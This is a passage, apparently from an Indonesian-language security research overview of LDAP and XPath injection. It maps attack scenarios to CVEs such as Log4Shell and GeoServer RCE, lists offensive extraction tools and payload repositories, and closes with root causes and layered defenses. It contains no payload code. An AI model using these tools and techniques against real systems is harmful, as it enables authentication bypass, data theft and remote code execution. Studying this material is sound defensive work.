|----------|-------------|---------------------------|----------|
| **Enterprise Login Portal** | Aplikasi web → autentikasi LDAP terhadap AD/OpenLDAP | §1-1, §2-1, §6-1, §7-1 | Authentication bypass massal |
| **Employee Directory Search** | Aplikasi web → pencarian LDAP dengan filter yang dikendalikan pengguna | §2-1, §3-1, §4-1 | Eksfiltrasi data direktori penuh |
| **XML-Based Configuration Portal** | Aplikasi web → query XPath pada file konfigurasi XML | §1-2, §4-2, §5-2 | Pencurian konfigurasi/kredensial, SSRF |
| **API SOAP/REST dengan Pemrosesan XML** | Endpoint API → evaluasi XPath pada XML permintaan | §1-2, §2-2, §5-2, §8-2 | Eksfiltrasi data, RCE via extension |
| **Manajemen Perangkat Jaringan (J-Web)** | Antarmuka admin → query XPath pada konfigurasi XML perangkat | §1-2, §7-2, §8-2 | Kompromi perangkat penuh, RCE |
| **Layanan Data Geospasial** | GeoServer/GeoTools → evaluasi properti XPath | §8-2 (commons-jxpath) | RCE tanpa autentikasi |
| **Aplikasi Java dengan JNDI** | Log4j/JNDI → LDAP lookup → deserialisasi | §9-1 | RCE tanpa autentikasi dalam skala besar |
| **Layanan XML Berbasis Cloud** | Aplikasi XPath 2.0 → doc() → cloud metadata | §5-2, §9-2 | Pengambilalihan akun cloud |
| **Endpoint SSO/Federation** | Pemrosesan SAML/XML → XPath dalam validasi assertion | §1-2, §4-2, §8-2 | Authentication bypass di seluruh layanan federasi |

---

## Pemetaan CVE / Bounty (2023–2025)

| Kombinasi Mutasi | CVE / Kasus | Produk | CVSS | Dampak |
|---------------------|-----------|---------|------|--------|
| §8-2 (commons-jxpath) + §9-2 | CVE-2024-36401 | GeoServer (semua instance) | 9.8 | RCE tanpa autentikasi via evaluasi properti XPath; dieksploitasi secara aktif di lapangan |
| §8-2 (commons-jxpath) | CVE-2024-36404 | GeoTools (<31.2, <30.4, <29.6) | 9.8 | RCE melalui evaluasi ekspresi XPath dalam library API |
| §8-2 + §1-2 | CVE-2024-39565 | Juniper Junos OS J-Web (SRX/EX) | High | XPath injection tanpa autentikasi → remote command execution pada perangkat jaringan |
| §8-2 (extension function) | CVE-2024-31573 | XMLUnit for Java (<2.10.0) | — | XPath injection via extension function XSLT |
| §9-1 (JNDI + LDAP) | CVE-2021-44228 (Log4Shell) | Log4j 2.0-beta9–2.14.1 (RCE); bypass di 2.15.0 (CVE-2021-45046); DoS di ≤2.16.0 (CVE-2021-45105) | 10.0 | JNDI/LDAP injection → RCE; salah satu kerentanan paling berdampak dalam sejarah |
| §1-1 + §7-1 | CVE-2024-37782 | Gladinet CentreStack | High | LDAP injection di field username → auth bypass + eksekusi perintah |
| §9-3 + §8-1 | CVE-2025-29810 | Active Directory Domain Services | 7.5 | LDAP injection → privilege escalation ke SYSTEM |
| Tingkat protokol LDAP | CVE-2024-49112 | Windows LDAP Service | 9.8 | RCE via permintaan LDAP yang dibuat khusus (tingkat protokol, bukan filter injection) |
| Tingkat protokol LDAP | CVE-2024-49113 (LDAPNightmare) | Windows LDAP Service | 7.5 | DoS — crash semua Windows Server via respons LDAP yang dibuat khusus |
| §7-1 | HackerOne #359290 | U.S. Dept of Defense | — | LDAP injection pada endpoint autentikasi (bug bounty) |

---

## Detection Tool

### Tool Ofensif

| Tool | Cakupan Target | Teknik Inti |
|------|-------------|---------------|
| **XCat** (Python) | Blind XPath injection | Ekstraksi berbasis boolean otomatis dengan `substring()`/`string-length()`; mendukung OOB via `doc()`; mendeteksi versi XPath dan memilih metode ekstraksi optimal |
| **xxxpwn** | XPath injection | Eksploitasi XPath lanjutan dengan varian predictive text (xxxpwn_smart) |
| **xpath-blind-explorer** | Blind XPath injection | Ekstraksi blind otomatis dengan penemuan schema |
| **XmlChor** | XPath injection | Framework eksploitasi XPath khusus |
| **lbi** (LDAP Blind Injection) | Blind LDAP injection | Ekstraksi atribut karakter demi karakter via wildcard matching |
| **LDAP-Injector** (C++) | LDAP injection | Pengujian sistematis kombinasi alfanumerik/simbol terhadap penanganan query LDAP |
| **Burp Suite (Active Scanner)** | LDAP + XPath | Pemindaian otomatis dengan penyisipan payload dan analisis diferensial respons |
| **OWASP ZAP** | LDAP + XPath | Aturan pemindaian aktif untuk deteksi LDAP/XPath injection |

### Tool Defensif

| Tool | Cakupan Target | Teknik Inti |
|------|-------------|---------------|
| **Invicti (Netsparker)** | LDAP + XPath (IAST) | Interactive Application Security Testing — mendeteksi injeksi saat runtime |
| **Semgrep** | LDAP + XPath (SAST) | Aturan analisis statis berbasis pola untuk konstruksi query yang tidak aman |
| **SonarQube** | LDAP + XPath (SAST) | Analisis statis untuk string concatenation dalam query LDAP/XPath |
| **ModSecurity (WAF)** | LDAP + XPath | Penyaringan permintaan berbasis regex untuk metacharacter injeksi |
| **StackHawk** | XPath (DAST) | Pemindaian dinamis dengan plugin deteksi XPath injection |

### Koleksi Referensi Payload

| Sumber Daya | Cakupan |
|----------|----------|
| **PayloadsAllTheThings — LDAP Injection** | Repositori payload komprehensif: auth bypass, blind extraction, attribute enumeration |
| **PayloadsAllTheThings — XPath Injection** | Repositori payload komprehensif: auth bypass, blind extraction, OOB, file read |
| **HackTricks — LDAP Injection** | Panduan teknik dengan detail spesifik implementasi dan skrip eksploitasi |
| **HackTricks — XPath Injection** | Panduan teknik dengan diferensiasi XPath 1.0/2.0 dan referensi tool |

---

## Ringkasan: Prinsip Inti

### Akar Penyebab

Baik LDAP injection maupun XPath injection ada karena satu pilihan desain fundamental: **bahasa query disematkan in-band bersama nilai data, dan tidak ada antarmuka parameterized query standar yang tersedia secara universal**. Tidak seperti SQL — yang akhirnya mengembangkan prepared statement dan parameterized query sebagai pertahanan yang terstandarisasi — filter LDAP (RFC 4515) dan ekspresi XPath tidak memiliki mekanisme parameterisasi standar yang setara. RFC 4515 LDAP mendefinisikan sintaks filter tetapi tidak memberikan spesifikasi untuk memisahkan struktur dari nilai di level protokol. Spesifikasi W3C XPath mendefinisikan sintaks ekspresi tetapi tidak menyediakan padanan placeholder `?` dari SQL. Ini memaksa developer membangun query via string concatenation, yang secara inheren rentan terhadap injeksi.

### Mengapa Perbaikan Inkremental Gagal

Validasi input dan character escaping adalah pertahanan utama yang direkomendasikan oleh OWASP dan dokumentasi vendor, tetapi keduanya gagal secara inkremental karena:

1. **Dua konteks escaping dalam LDAP**: Escaping DN (RFC 2253) dan escaping search filter (RFC 4515) memiliki set karakter dan aturan yang berbeda. Developer sering menerapkan escaping yang salah untuk konteksnya, meninggalkan metacharacter tidak ter-escape.
2. **Proliferasi versi XPath**: XPath 1.0 memiliki attack surface yang terbatas, tetapi XPath 2.0/3.0/3.1 menambahkan `doc()`, `error()`, `if/then/else`, dan extension function yang secara dramatis memperluasnya. Pertahanan yang dirancang untuk 1.0 tidak memadai untuk 2.0+.
3. **Parsing spesifik implementasi**: Server LDAP yang berbeda (OpenLDAP, AD, SunOne) dan library XPath (libxml2, Saxon, commons-jxpath) mem-parse edge case secara berbeda (§8), membuat aturan escaping universal tidak dapat diandalkan.
4. **Unicode normalization**: Normalisasi Unicode sisi server dapat mengubah input yang "aman" kembali menjadi metacharacter setelah validasi dilakukan (§6-1, §6-2).
5. **Opasitas perangkaian**: Dampak paling parah (RCE via JNDI/deserialisasi, SSRF via `doc()`) terjadi melalui perangkaian dengan kelas serangan yang berdekatan (§9), yang tidak terlihat oleh pertahanan yang berfokus pada injeksi.

### Solusi Struktural

Solusi struktural memerlukan pertahanan di beberapa lapisan:

1. **Parameterized/prepared query API** di mana pun tersedia (misalnya LINQ-to-LDAP untuk .NET, parameterized XPath API dalam library XML modern).
2. **Validasi allowlist yang ketat** — bukan blacklist escaping — di batas input, hanya mengizinkan string alfanumerik pendek dalam parameter LDAP/XPath.
3. **Prinsip least privilege** pada binding account LDAP, memastikan bahwa bahkan injeksi yang berhasil tidak dapat mengakses atribut sensitif (`userPassword`, `unicodePwd`) atau OU yang berprivilese.
4. **Pembatasan versi XPath** — menonaktifkan `doc()`, extension function, dan akses dokumen eksternal di level konfigurasi library ketika tidak diperlukan.
5. **Aturan WAF** sebagai pertahanan berlapis (bukan pertahanan utama), yang menyadari varian encoding metacharacter LDAP maupun XPath.

---

*Dokumen ini dibuat untuk keperluan riset keamanan defensif dan pemahaman kerentanan.*

## Referensi

- OWASP — LDAP Injection: https://owasp.org/www-community/attacks/LDAP_Injection
- OWASP — XPath Injection: https://owasp.org/www-community/attacks/XPATH_Injection
- OWASP — Blind XPath Injection: https://owasp.org/www-community/attacks/Blind_XPath_Injection
- OWASP — LDAP Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html
- BlackHat Europe 2008 — LDAP Injection & Blind LDAP Injection in Web Applications (Alonso, Parada): https://blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
- BlackHat USA 2016 — A Journey From JNDI/LDAP Manipulation to RCE Dream Land (Munoz): https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf
- BlackHat Europe 2012 — Hacking XPath 2.0 (Siddharth): https://media.blackhat.com/bh-eu-12/Siddharth/bh-eu-12-Siddharth-Xpath-WP.pdf
- Watchfire — Blind XPath Injection Whitepaper: https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf
- PayloadsAllTheThings — LDAP Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
- PayloadsAllTheThings — XPath Injection: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection
- HackTricks — LDAP Injection: https://book.hacktricks.wiki/pentesting-web/ldap-injection.html
- HackTricks — XPath Injection: https://book.hacktricks.wiki/pentesting-web/xpath-injection.html
- XCat — XPath Injection Tool: https://github.com/orf/xcat
- CVE-2024-36401 — GeoServer RCE: https://github.com/geoserver/geoserver/security/advisories/GHSA-6jj6-gm7p-fcvv
- CVE-2024-39565 — Juniper J-Web XPath Injection: https://nvd.nist.gov/vuln/detail/CVE-2024-39565
- CVE-2024-49112/49113 — Windows LDAP RCE/DoS: https://www.trendmicro.com/en_us/research/25/a/what-we-know-about-cve-2024-49112-and-cve-2024-49113.html
- CVE-2025-29810 — Active Directory LDAP Injection: https://nvd.nist.gov/vuln/detail/CVE-2025-29810
- Rhino Security Labs — XPath Injection Attack and Defense: https://rhinosecuritylabs.com/penetration-testing/xpath-injection-attack-defense-techniques/
- SANS — Understanding and Exploiting Web-based LDAP: https://www.sans.org/blog/understanding-and-exploiting-web-based-ldap